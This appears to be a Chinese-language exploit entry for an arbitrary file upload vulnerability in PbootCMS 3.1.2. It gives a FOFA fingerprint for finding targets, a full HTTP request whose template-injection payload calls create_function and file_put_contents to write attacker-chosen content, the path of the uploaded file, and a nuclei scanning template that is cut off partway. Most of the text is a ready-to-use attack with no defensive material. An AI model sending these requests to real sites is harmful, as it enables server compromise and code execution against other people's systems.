# PbootCMSpboot存在任意文件上传漏洞

- **系统**：PbootCMSpboot　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="PBOOTCMS"`
- **请求**：`POST /?tag/index=&tag={pbohome/Indexot:if(1)(usort/*%3e*/(post/*%3e*/(/*%3e*/1),create_function/*%3e*/(/*%3e*/post/*%3e*/(/*%3e*/2),post/*%3e*/(/*%3e*/3))));//)}(123){/pbhome/Indexoot:if}&tagstpl=news.html&lnoc2tspfar1_ue HTTP/1.1`
- **关键头**：`Cookie: lg=call_user_func`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 97`

**请求体 / payload**
```
1[]=ayaq.txt&1[]=YXk=&2=$a,$b&3=return var_dump(file_put_contents($b,base64_decode($a)));
上传文件地址
/ayaq.txt

如下nuclei脚本有安云安全内部群鲁鲁师傅提供：
id: pbootcms-uploadfile
info:
name: pbootcms-uploadfile
author: lulu
severity: high
description: pbootcms-任意文件上传
http:
- raw:
-
POST /?tag/index=&tag={pbohome/Indexot:if(1)(usort/*%3e*/(post/*%3e*/(/*%3e*/1),create_function/*%3e*/(/*%3e*/post/*%3e*/(/*%3e*/2),post/*%3e*/(/*%3e*/3))));//)}(123){/pbhome/Indexoot:if}&tagstpl=news.html&lnoc2tspfar1_ue HTTP/1.1
Host: {{Hostname}}
Cookie: lg=call_user_func
Content-Type: application/x-www-form-urlencoded
Content-Lengt…（脚本共 824 字，完整版见原文）
```

**其他**
- PbootCMS pboot存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PbootCMS 3.1.2